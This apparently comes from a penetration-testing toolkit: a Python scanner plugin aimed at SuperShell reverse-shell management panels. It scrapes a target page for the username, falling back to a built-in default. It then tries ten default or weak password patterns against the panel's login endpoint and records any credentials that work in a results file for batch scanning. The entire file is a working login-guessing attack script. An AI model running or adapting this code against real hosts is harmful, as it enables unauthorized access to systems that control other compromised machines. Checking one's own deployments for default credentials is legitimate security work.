import json
import re
import urllib3,requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class SuperShellMrPass_Scan:
    def log_user(self,url):
        baseurl = url + "/supershell/log/.js"
        try:
            req = requests.get(baseurl, headers=self.headers, proxies=self.proxy, verify=self.ssl, timeout=self.timeout)
            if "Hacker" not in req.text:
                log_username = "tdragon6"
            pattern = r'<div class="d-none d-xl-block ps-2">\s*<div>(.*?)<\/div>'
            match = re.search(pattern, req.text, re.DOTALL)
            if match:
                log_username = match.group(1).strip()
            return log_username
        except Exception:
            log_username = "tdragon6"
            return log_username

    def run(self,url,log_username):
        base_url = url + "/supershell/login/auth"
        headers = {
            "User-Agent":self.headers["User-Agent"],
            "Content-Type": "application/json"
        }
        data = {"username":log_username,"password":log_username+"!@#"}
        try:
            response = requests.post(base_url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout,json=data)
            json_str = json.loads(response.text)

            if "success" == json_str.get("result"):
                OutPrintInfoSuc("SuperShell", f"目标存在默认密钥漏洞:{base_url} | {log_username}/{log_username}!@#")
                if self.batch:
                    OutPutFile("supershell_moren_passwd.txt",f"目标存在默认密钥漏洞: {base_url} | {log_username}/{log_username}!@#")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SuperShell", "目标不存在SuperShell默认密钥漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("SuperShell", e)
                return False
    def run2(self,url,log_username):
        base_url = url + "/supershell/login/auth"
        headers = {
            "User-Agent":self.headers["User-Agent"],
            "Content-Type": "application/json"
        }
        data = {"username":log_username,"password":"tdragon6"}
        try:
            response = requests.post(base_url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout,json=data)
            json_str = json.loads(response.text)

            if "success" == json_str.get("result"):
                OutPrintInfoSuc("SuperShell", f"目标存在默认密钥漏洞:{base_url} | {log_username}/tdragon6")
                if self.batch:
                    OutPutFile("supershell_moren_passwd.txt",f"目标存在默认密钥漏洞: {base_url} | {log_username}/tdragon6")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SuperShell", "目标不存在SuperShell默认密钥漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("SuperShell", e)
                return False
    def run3(self,url,log_username):
        base_url = url + "/supershell/login/auth"
        headers = {
            "User-Agent":self.headers["User-Agent"],
            "Content-Type": "application/json"
        }
        data = {"username":log_username,"password":log_username}
        try:
            response = requests.post(base_url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout,json=data)
            json_str = json.loads(response.text)

            if "success" == json_str.get("result"):
                OutPrintInfoSuc("SuperShell", f"目标存在默认密钥漏洞:{base_url} | {log_username}/{log_username}")
                if self.batch:
                    OutPutFile("supershell_moren_passwd.txt",f"目标存在默认密钥漏洞: {base_url} | {log_username}/{log_username}")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SuperShell", "目标不存在SuperShell默认密钥漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("SuperShell", e)
                return False
    def run4(self,url,log_username):
        base_url = url + "/supershell/login/auth"
        headers = {
            "User-Agent":self.headers["User-Agent"],
            "Content-Type": "application/json"
        }
        data = {"username":log_username,"password":log_username+"123"}
        try:
            response = requests.post(base_url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout,json=data)
            json_str = json.loads(response.text)

            if "success" == json_str.get("result"):
                OutPrintInfoSuc("SuperShell", f"目标存在默认密钥漏洞:{base_url} | {log_username}/{log_username}123")
                if self.batch:
                    OutPutFile("supershell_moren_passwd.txt",f"目标存在默认密钥漏洞: {base_url} | {log_username}/{log_username}123")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SuperShell", "目标不存在SuperShell默认密钥漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("SuperShell", "目标请求出错")
                return False
    def run5(self,url,log_username):
        base_url = url + "/supershell/login/auth"
        headers = {
            "User-Agent":self.headers["User-Agent"],
            "Content-Type": "application/json"
        }
        data = {"username":log_username,"password":log_username+"@123"}
        try:
            response = requests.post(base_url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout,json=data)
            json_str = json.loads(response.text)

            if "success" == json_str.get("result"):
                OutPrintInfoSuc("SuperShell", f"目标存在默认密钥漏洞:{base_url} | {log_username}/{log_username}@123")
                if self.batch:
                    OutPutFile("supershell_moren_passwd.txt",f"目标存在默认密钥漏洞: {base_url} | {log_username}/{log_username}@123")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SuperShell", "目标不存在SuperShell默认密钥漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("SuperShell", "目标请求出错")
                return False
    def run6(self,url,log_username):
        base_url = url + "/supershell/login/auth"
        headers = {
            "User-Agent":self.headers["User-Agent"],
            "Content-Type": "application/json"
        }
        data = {"username":log_username,"password":"admin123"}
        try:
            response = requests.post(base_url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout,json=data)
            json_str = json.loads(response.text)

            if "success" == json_str.get("result"):
                OutPrintInfoSuc("SuperShell", f"目标存在默认密钥漏洞:{base_url} | {log_username}/admin123")
                if self.batch:
                    OutPutFile("supershell_moren_passwd.txt",f"目标存在默认密钥漏洞: {base_url} | {log_username}/admin123")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SuperShell", "目标不存在SuperShell默认密钥漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("SuperShell", "目标请求出错")
                return False
    def run7(self,url,log_username):
        base_url = url + "/supershell/login/auth"
        headers = {
            "User-Agent":self.headers["User-Agent"],
            "Content-Type": "application/json"
        }
        data = {"username":log_username,"password":log_username+"@888"}
        try:
            response = requests.post(base_url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout,json=data)
            json_str = json.loads(response.text)

            if "success" == json_str.get("result"):
                OutPrintInfoSuc("SuperShell", f"目标存在默认密钥漏洞:{base_url} | {log_username}/{log_username}@888")
                if self.batch:
                    OutPutFile("supershell_moren_passwd.txt",f"目标存在默认密钥漏洞: {base_url} | {log_username}/{log_username}@888")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SuperShell", "目标不存在SuperShell默认密钥漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("SuperShell", "目标请求出错")
                return False
    def run8(self,url,log_username):
        base_url = url + "/supershell/login/auth"
        headers = {
            "User-Agent":self.headers["User-Agent"],
            "Content-Type": "application/json"
        }
        data = {"username":log_username,"password":log_username+"888"}
        try:
            response = requests.post(base_url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout,json=data)
            json_str = json.loads(response.text)

            if "success" == json_str.get("result"):
                OutPrintInfoSuc("SuperShell", f"目标存在默认密钥漏洞:{base_url} | {log_username}/{log_username}888")
                if self.batch:
                    OutPutFile("supershell_moren_passwd.txt",f"目标存在默认密钥漏洞: {base_url} | {log_username}/{log_username}888")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SuperShell", "目标不存在SuperShell默认密钥漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("SuperShell", "目标请求出错")
                return False
    def run9(self,url,log_username):
        base_url = url + "/supershell/login/auth"
        headers = {
            "User-Agent":self.headers["User-Agent"],
            "Content-Type": "application/json"
        }
        data = {"username":log_username,"password":log_username+"@"}
        try:
            response = requests.post(base_url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout,json=data)
            json_str = json.loads(response.text)

            if "success" == json_str.get("result"):
                OutPrintInfoSuc("SuperShell", f"目标存在默认密钥漏洞:{base_url} | {log_username}/{log_username}@")
                if self.batch:
                    OutPutFile("supershell_moren_passwd.txt",f"目标存在默认密钥漏洞: {base_url} | {log_username}/{log_username}@")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SuperShell", "目标不存在SuperShell默认密钥漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("SuperShell", "目标请求出错")
                return False
    def run10(self,url,log_username):
        base_url = url + "/supershell/login/auth"
        headers = {
            "User-Agent":self.headers["User-Agent"],
            "Content-Type": "application/json"
        }
        data = {"username":log_username,"password":"@"+log_username}
        try:
            response = requests.post(base_url,headers=headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout,json=data)
            json_str = json.loads(response.text)

            if "success" == json_str.get("result"):
                OutPrintInfoSuc("SuperShell", f"目标存在默认密钥漏洞:{base_url} | {log_username}/@{log_username}")
                if self.batch:
                    OutPutFile("supershell_moren_passwd.txt",f"目标存在默认密钥漏洞: {base_url} | {log_username}/@{log_username}")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SuperShell", "目标不存在SuperShell默认密钥漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("SuperShell", "目标请求出错")
                return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        headers = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=headers, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("SuperShell", f"开始检测SuperShell默认密钥漏洞...")
        log_username = self.log_user(url)
        poc_list = [
            self.run,
            self.run2,
            self.run3,
            self.run4,
            self.run5,
            self.run6,
            self.run7,
            self.run8,
            self.run9,
            self.run10,
        ]
        for poc in poc_list:
            if poc(url,log_username):
                break
        if not self.batch:
            OutPrintInfo("SuperShell", f"SuperShell默认密钥漏洞检测结束")

